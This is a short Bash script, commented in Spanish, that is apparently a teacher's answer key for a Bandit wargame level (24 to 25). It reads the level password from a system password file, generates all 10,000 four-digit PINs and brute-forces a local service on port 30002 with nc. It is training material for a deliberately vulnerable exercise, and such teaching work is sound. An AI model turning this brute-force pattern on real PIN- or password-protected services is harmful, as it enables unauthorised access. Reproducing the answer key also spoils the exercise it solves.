#!/bin/bash
# Solución docente · Bandit 24 → 25 · NO REPARTIR
# Correr como bandit24 dentro de una carpeta creada con: cd "$(mktemp -d)"

CLAVE=$(cat /etc/bandit_pass/bandit24)

for PIN in $(seq -w 0 9999); do
    echo "$CLAVE $PIN"
done > intentos.txt

wc -l intentos.txt

# Una sola conexión con las 10 000 líneas.
# -N: al terminar el archivo, nc avisa al servidor (cierra su lado de escritura) y sigue
#     leyendo respuestas; sin -N, nc puede quedarse colgado o cortar antes de tiempo.
# Probado contra un servicio simulado: la línea "Correct!" sale en < 1 s.
# Si el servicio real corta por timeout, dividir: split -l 2500 intentos.txt parte_
# y enviar cada parte con el mismo comando.
nc -N localhost 30002 < intentos.txt | grep -v -e "Wrong" -e "Please enter"
